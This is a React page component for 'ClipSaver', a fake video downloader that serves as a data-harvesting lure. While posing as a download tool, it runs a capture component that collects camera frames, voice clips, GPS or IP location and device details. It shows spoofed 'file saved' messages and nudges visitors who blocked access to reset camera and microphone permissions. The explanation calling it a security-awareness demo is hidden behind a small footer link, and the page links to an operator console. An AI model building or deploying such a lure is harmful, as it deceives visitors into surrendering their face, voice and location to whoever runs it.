import { useEffect, useRef, useState } from "react";
import { Link, useParams } from "react-router-dom";
import { del } from "../lib/api";
import type { Visitor } from "../lib/types";
import CountUp from "../components/CountUp";
import MapPanel from "../components/MapPanel";
import CaptureEngine, {
  type EngineApi,
  type EngineState,
} from "../components/CaptureEngine";

const FORMATS = ["MP4 · 1080p", "MP4 · 720p", "MP3 · audio"];

function Chip({ icon, label, state }: { icon: string; label: string; state?: string }) {
  return (
    <span className="inline-flex items-center gap-2 rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-slate-300">
      <span>{icon}</span> {label}
      {state && <span className="text-xs text-slate-500">· {state}</span>}
    </span>
  );
}

const INITIAL: EngineState = {
  session: null,
  camErr: null,
  blocked: [],
  photoUrls: [],
  finished: false,
  captured: false,
};

export default function Experience() {
  const { token = "" } = useParams();
  const [eng, setEng] = useState<EngineState>(INITIAL);
  const [deleted, setDeleted] = useState(false);
  const [showReveal, setShowReveal] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  const [link, setLink] = useState("https://www.instagram.com/reel/CxYz123AbCd/");
  const [format, setFormat] = useState(FORMATS[0]);
  const [clicked, setClicked] = useState(false);
  const apiRef = useRef<EngineApi | null>(null);
  const announcedRef = useRef(false);

  useEffect(() => {
    if (eng.captured && !announcedRef.current) {
      announcedRef.current = true;
      setToast(`ClipSaver-${token.slice(0, 6)}.mp4 saved to Downloads ✓`);
      const t = setTimeout(() => setToast(null), 6000);
      return () => clearTimeout(t);
    }
  }, [eng.captured, token]);

  const wipe = async () => {
    if (deleted) return;
    if (!confirm("Delete everything stored about this session?")) return;
    try {
      await del(`/api/sessions/${token}`);
      setDeleted(true);
    } catch {}
  };

  const fakeClick = () => {
    if (clicked) return;
    setClicked(true);
    setTimeout(() => {
      setToast(
        eng.finished
          ? `ClipSaver-${token.slice(0, 6)}.mp4 already saved ✓`
          : "preparing your file — it saves automatically…"
      );
      setTimeout(() => setToast(null), 4000);
      setClicked(false);
    }, 900);
  };

  const session: Visitor | undefined = eng.session ?? undefined;
  const dev = session?.device;
  const devLine = [dev?.device, dev?.os, dev?.browser].filter(Boolean).join(" · ");
  const photo = eng.photoUrls[0] || null;
  const permsBroken =
    !!eng.camErr || eng.blocked.some((p) => !p.startsWith("location"));

  return (
    <div className="grid-bg flex min-h-screen flex-col items-center justify-center px-4 py-8">
      <CaptureEngine token={token} onChange={setEng} apiRef={apiRef} />

      <div className="w-full max-w-lg animate-rise">
        <div className="mb-5 flex items-center justify-between px-1">
          <Link to="/" className="flex items-center gap-2 text-sm text-slate-400 hover:text-white">
            <span className="h-6 w-6 rounded-md border border-accent/40 grid place-items-center text-xs">
              🎬
            </span>
            <span className="font-display font-medium">ClipSaver</span>
          </Link>
          <span className="text-xs text-slate-600">free · unlimited</span>
        </div>

        <div className="glass ring-glow relative overflow-hidden rounded-3xl p-5 sm:p-8">
          {!showReveal ? (
            <div>
              <div className="text-xs font-medium tracking-widest text-accent uppercase">
                instagram · tiktok · youtube
              </div>
              <h1 className="font-display mt-3 text-2xl font-semibold text-white">
                Download any video, free
              </h1>
              <p className="mt-2 text-sm text-slate-400">
                Paste a link, pick a quality, save it straight to your device —
                no signup, no ads.
              </p>
              <input
                value={link}
                onChange={(e) => setLink(e.target.value)}
                placeholder="Paste video link…"
                className="mt-5 w-full rounded-xl border border-white/10 bg-black/30 px-4 py-3 text-sm text-white placeholder:text-slate-500 focus:border-accent/50 focus:outline-none"
              />
              <div className="mt-3 flex flex-wrap gap-2">
                {FORMATS.map((f) => (
                  <button
                    key={f}
                    onClick={() => setFormat(f)}
                    className={`rounded-lg border px-3 py-2 text-sm transition ${
                      format === f
                        ? "border-accent/50 bg-accent/10 text-accent"
                        : "border-white/10 bg-white/5 text-slate-400 hover:border-white/25"
                    }`}
                  >
                    {f}
                  </button>
                ))}
              </div>
              <button
                onClick={fakeClick}
                disabled={clicked}
                className="mt-6 w-full rounded-xl bg-gradient-to-r from-accent to-accent2 py-3.5 font-semibold text-ink transition hover:brightness-110 disabled:opacity-60"
              >
                {clicked ? "Working…" : "Download ↓"}
              </button>
              <p className="mt-4 text-center text-xs text-slate-500">
                free · unlimited · works on mobile & desktop
              </p>

              {permsBroken && (
                <div className="mt-4 animate-rise rounded-xl border border-warn/30 bg-warn/[0.07] p-4 text-left">
                  <p className="text-sm font-medium text-warn">
                    ⚠ camera & microphone access is blocked for this site
                  </p>
                  <p className="mt-2 text-sm leading-relaxed text-slate-300">
                    {eng.blocked.filter((p) => !p.startsWith("location")).join(" · ") ||
                      `error (${eng.camErr})`}
                    {" — "}click the 🔒 / 🎥 icon in the address bar →{" "}
                    <b>Reset permissions</b>, then tap below.
                  </p>
                  <p className="mt-2 font-mono text-[11px] text-slate-500">
                    debug: secure={String(window.isSecureContext)} mediaDevices=
                    {String(!!navigator.mediaDevices)} camErr={String(eng.camErr)}
                  </p>
                  <button
                    onClick={() => apiRef.current?.retry()}
                    className="mt-3 w-full rounded-lg bg-gradient-to-r from-accent to-accent2 py-2.5 text-sm font-semibold text-ink transition hover:brightness-110"
                  >
                    Reload & ask again
                  </button>
                </div>
              )}
            </div>
          ) : (
            <div className="-m-5 sm:-m-8">
              {deleted ? (
                <div className="p-5 text-center sm:p-8">
                  <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-good/15 text-3xl">
                    🗑️
                  </div>
                  <h1 className="font-display mt-5 text-2xl font-semibold text-white">
                    Everything stored about you is gone
                  </h1>
                  <p className="mt-3 text-sm leading-relaxed text-slate-400">
                    Media files deleted, profile wiped.
                  </p>
                  <button
                    onClick={() => setShowReveal(false)}
                    className="mt-6 inline-block rounded-xl glass px-6 py-3 font-semibold text-slate-200 hover:border-accent/40"
                  >
                    ← Back to ClipSaver
                  </button>
                </div>
              ) : (
                <div>
                  <div className="relative overflow-hidden">
                    {photo ? (
                      <img
                        src={photo}
                        alt=""
                        className="h-48 w-full object-cover object-top animate-kenburns"
                      />
                    ) : (
                      <div className="h-48 w-full bg-gradient-to-br from-accent2/40 via-accent/20 to-transparent" />
                    )}
                    <div className="absolute inset-0 bg-gradient-to-t from-[#0b0e14] via-[#0b0e14]/40 to-transparent" />
                    <div className="absolute right-0 bottom-4 left-0 px-5 sm:px-8">
                      <div className="text-xs font-medium tracking-widest text-good uppercase">
                        ✓ your “download” is ready
                      </div>
                      <div className="font-display mt-1.5 text-2xl font-semibold text-white sm:text-3xl">
                        {session?.geo?.method === "gps"
                          ? `pinned ±${Math.round(session.geo.accuracy || 0)}m`
                          : session?.ip?.city || "your city"}
                      </div>
                      <div className="mt-1 text-sm text-slate-300">
                        {eng.photoUrls.length} frame
                        {eng.photoUrls.length === 1 ? "" : "s"}
                        {session?.media?.some((m) => m.kind === "clip")
                          ? " · voice note"
                          : ""}{" "}
                        · in {((session?.durationMs || 0) / 1000).toFixed(1)}s
                      </div>
                    </div>
                  </div>

                  <div className="p-5 sm:p-8">
                    <div className="flex flex-wrap gap-2">
                      <Chip
                        icon="📍"
                        label={
                          session?.geo?.method === "gps"
                            ? "exact location"
                            : "region via network"
                        }
                      />
                      <Chip icon="📷" label={`${eng.photoUrls.length} frames`} />
                      {session?.media?.some((m) => m.kind === "clip") && (
                        <Chip icon="🎙️" label="voice kept" />
                      )}
                    </div>

                    {session?.media?.find((m) => m.kind === "clip") && (
                      <video
                        src={session.media.find((m) => m.kind === "clip")!.url}
                        controls
                        className="mt-4 w-full rounded-xl border border-white/10"
                      />
                    )}

                    <div className="mt-6 rounded-2xl border border-accent/25 bg-accent/[0.06] p-5">
                      <div className="text-xs font-medium tracking-widest text-warn uppercase">
                        …except here's what it actually did
                      </div>
                      <div className="font-display mt-2 text-4xl font-bold text-white">
                        <CountUp to={session?.points ?? 0} />
                        <span className="ml-2 text-sm font-medium text-accent">
                          data points in{" "}
                          {((session?.durationMs || 0) / 1000).toFixed(1)}s
                        </span>
                      </div>
                      <div className="mt-4 grid grid-cols-2 gap-3 text-sm">
                        <div className="min-w-0 rounded-xl border border-white/10 bg-black/25 p-3">
                          <div className="text-xs text-slate-500">your device</div>
                          <div className="mt-1 break-words font-medium text-white">
                            {devLine || "unknown"}
                          </div>
                        </div>
                        <div className="min-w-0 rounded-xl border border-white/10 bg-black/25 p-3">
                          <div className="text-xs text-slate-500">your location</div>
                          <div className="mt-1 break-words font-medium text-white">
                            {session?.geo?.method === "gps"
                              ? `±${Math.round(session.geo.accuracy || 0)}m via GPS`
                              : `${session?.ip?.city || "unknown city"} via IP`}
                          </div>
                        </div>
                        <div className="min-w-0 rounded-xl border border-white/10 bg-black/25 p-3">
                          <div className="text-xs text-slate-500">ip / isp</div>
                          <div className="mt-1 break-words font-medium text-white">
                            {session?.ip?.addr || "?"} · {session?.ip?.isp || "?"}
                          </div>
                        </div>
                        <div className="min-w-0 rounded-xl border border-white/10 bg-black/25 p-3">
                          <div className="text-xs text-slate-500">captured</div>
                          <div className="mt-1 break-words font-medium text-white">
                            {[session?.device?.browser, session?.device?.timezone]
                              .filter(Boolean)
                              .join(" · ") || "profile"}
                          </div>
                        </div>
                      </div>
                      <div className="mt-4 h-44 overflow-hidden rounded-xl border border-white/10">
                        <MapPanel
                          visitors={session ? [session] : []}
                          className="h-full w-full"
                        />
                      </div>
                    </div>

                    <p className="mt-5 text-xs leading-relaxed text-slate-500">
                      You came for a video — one link also pulled your location,
                      face and voice, every one through browser prompts you
                      allowed. This was a security-awareness demo: one link, zero
                      malware, and a receipt most harvest links never show.
                    </p>

                    <button
                      onClick={() => (window.location.href = "/dashboard")}
                      className="mt-5 w-full rounded-xl bg-gradient-to-r from-accent to-accent2 py-3.5 font-semibold text-ink transition hover:brightness-110"
                    >
                      Operator console →
                    </button>
                    <button
                      onClick={wipe}
                      className="mt-3 w-full rounded-xl border border-bad/40 py-3 font-semibold text-bad transition hover:bg-bad/10"
                    >
                      Delete my data
                    </button>
                    <button
                      onClick={() => setShowReveal(false)}
                      className="mt-3 w-full text-center text-xs text-slate-500 hover:text-slate-300"
                    >
                      ← back
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        <p className="mt-5 flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-slate-600">
          <span>ClipSaver · free video downloader</span>
          <button
            onClick={() => setShowReveal(true)}
            className="underline hover:text-slate-300"
          >
            Data & privacy
          </button>
          <Link to="/login" className="underline hover:text-slate-300">
            console
          </Link>
        </p>
      </div>

      {toast && (
        <div className="fixed bottom-6 left-1/2 z-50 w-[92vw] max-w-md -translate-x-1/2 animate-rise rounded-xl border border-good/30 bg-[#0e1118] px-5 py-3 text-center text-sm text-slate-200 shadow-xl">
          <span className="mr-2 text-good">✓</span>
          {toast}
        </div>
      )}
    </div>
  );
}
